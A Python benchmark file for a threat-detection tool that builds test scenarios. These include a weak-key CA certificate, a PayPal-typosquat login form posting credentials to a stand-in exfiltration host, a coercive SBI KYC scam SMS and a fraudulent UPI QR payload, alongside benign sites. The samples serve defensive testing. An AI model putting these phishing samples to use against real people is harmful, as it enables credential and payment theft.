"""
Mandatory Benchmark Scenarios for K9 Sentinel AI (Hack Matrix 2026)
Defines 6 verifiable evaluation scenarios:
- 3 Suspicious / Malicious Test Cases:
    1. eMudhra NIST P-384 Weak CA Key (Mozilla Bug 2083449, scalar d=4)
    2. PayPal Distance-1 Typosquat + Cross-Origin Credential Harvesting DOM
    3. Indian Banking Coercive SMS Phishing (SBI KYC 24h deadline)
- 3 Benign / Safe Test Cases:
    4. Python Software Foundation (python.org)
    5. Bharti Airtel Xstream Promotional Deep Link (open.airtelxstream.in/Watch4Free)
    6. Google Corporate Infrastructure (google.com)
"""

import datetime
from typing import Any
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec

from models.schemas import MasterScanResponse, InputType, RiskTier
from engine.orchestrator import orchestrate_full_scan, orchestrate_qr_scan


def generate_emudhra_weak_certificate_pem(scalar: int = 4) -> str:
    """Generates an in-memory X.509 certificate matching Mozilla Bug 2083449 eMudhra weak scalar defect."""
    priv = ec.derive_private_key(scalar, ec.SECP384R1())
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "eMudhra Sub-CA Simulated Weak Key"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "eMudhra Technologies Limited"),
    ])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(priv.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=365))
        .sign(priv, hashes.SHA384())
    )
    return cert.public_bytes(serialization.Encoding.PEM).decode("utf-8")


BENCHMARK_SCENARIOS = [
    {
        "id": "scenario-1-emudhra-weak-ca",
        "name": "Mozilla Bug 2083449: eMudhra Weak NIST P-384 CA Key",
        "category": "Cryptographic Trust (Cybersecurity)",
        "expected_risk": "Confirmed Malicious",
        "description": "NIST P-384 intermediate CA generated with low-entropy private scalar d=4. Trivial discrete log recovery (<1ms).",
        "target": generate_emudhra_weak_certificate_pem(4),
        "input_type": InputType.RAW_PEM_CERT,
    },
    {
        "id": "scenario-2-paypal-typosquat-harvest",
        "name": "PayPal Typosquat & Cross-Origin Form Harvesting",
        "category": "Phishing & Threat Heuristics",
        "expected_risk": "Confirmed Malicious",
        "description": "Distance-1 brand typosquat (paypa1-secure.com) combined with cross-origin credential harvesting DOM form posting passwords to an external origin.",
        "target": "https://paypa1-secure.com/login",
        "input_type": InputType.URL,
        "html_content": """
        <html>
          <body>
            <h2>PayPal Secure Login</h2>
            <form action="https://evil-exfiltrator.net/steal.php" method="POST">
              <input type="text" name="email" placeholder="Email address">
              <input type="password" name="password" placeholder="Password">
              <button type="submit">Log In</button>
            </form>
          </body>
        </html>
        """,
    },
    {
        "id": "scenario-3-sbi-kyc-sms-scam",
        "name": "Indian Banking Deceptive Urgency SMS Scam",
        "category": "AI Scam Intent & MITRE ATT&CK",
        "expected_risk": "Confirmed Malicious",
        "description": "Psychological coercion SMS impersonating SBI NetBanking threatening 24-hour account deactivation unless unverified KYC link is clicked.",
        "target": "Dear customer, your SBI NetBanking account will be blocked today within 24h due to pending KYC update. Click http://sbi-kyc-update.in to verify now or call 9876543210.",
        "input_type": InputType.TEXT_MESSAGE,
    },
    {
        "id": "scenario-4-python-foundation-benign",
        "name": "Python Software Foundation Official Portal",
        "category": "Benign Infrastructure",
        "expected_risk": "Low Risk",
        "description": "Legitimate open-source foundation portal with valid DigiCert TLS certificate, high-grade headers, and safe security posture.",
        "target": "https://python.org",
        "input_type": InputType.URL,
    },
    {
        "id": "scenario-5-airtel-xstream-deep-link",
        "name": "Bharti Airtel Xstream Promotional Deep Link",
        "category": "Benign Infrastructure (India Telecom)",
        "expected_risk": "Low Risk",
        "description": "Genuine telecom promotional deep link from Bharti Airtel Xstream (open.airtelxstream.in/Watch4Free) that safely unrolls to official Apple App Store.",
        "target": "https://open.airtelxstream.in/Watch4Free",
        "input_type": InputType.URL,
    },
    {
        "id": "scenario-6-google-corporate-official",
        "name": "Google Corporate Official Infrastructure",
        "category": "Benign Infrastructure",
        "expected_risk": "Low Risk",
        "description": "Global official corporate infrastructure featuring HSTS preloading, multi-layered CSP, and valid Google Trust Services CA certificates.",
        "target": "https://google.com",
        "input_type": InputType.URL,
    },
    {
        "id": "scenario-7-electricity-quishing-upi",
        "name": "State Electricity Discom QR Quishing & Malicious UPI Fraud",
        "category": "QR Phishing (Quishing) & Financial Fraud",
        "expected_risk": "Confirmed Malicious",
        "description": "Fraudulent electricity bill disconnection notice embedding a malicious QR code directing payment to a consumer VPA masquerading as state utility BESCOM.",
        "target": "upi://pay?pa=bescom.electricity.bill@okhdfcbank&pn=StateElectricityDiscom&am=4800&cu=INR",
        "input_type": InputType.QR_CODE,
    },
]


def list_benchmark_scenarios() -> list[dict[str, Any]]:
    """Returns metadata for all 6 benchmark scenarios for API and UI rendering."""
    return [
        {
            "id": sc["id"],
            "name": sc["name"],
            "category": sc["category"],
            "expected_risk": sc["expected_risk"],
            "description": sc["description"],
            "input_type": sc["input_type"].value,
            "target_preview": sc["target"][:80] + ("..." if len(sc["target"]) > 80 else ""),
        }
        for sc in BENCHMARK_SCENARIOS
    ]


async def run_benchmark_scenario(scenario_id: str) -> MasterScanResponse:
    """Executes a specific benchmark scenario live through the unified threat orchestrator."""
    matched = next((sc for sc in BENCHMARK_SCENARIOS if sc["id"] == scenario_id), None)
    if not matched:
        raise ValueError(f"Scenario '{scenario_id}' not found. Available: {[s['id'] for s in BENCHMARK_SCENARIOS]}")

    if matched["input_type"] == InputType.QR_CODE:
        import io
        import qrcode

        img = qrcode.make(matched["target"])
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return await orchestrate_qr_scan(buf.getvalue())

    return await orchestrate_full_scan(
        target=matched["target"],
        override_input_type=matched["input_type"],
        html_content=matched.get("html_content"),
    )
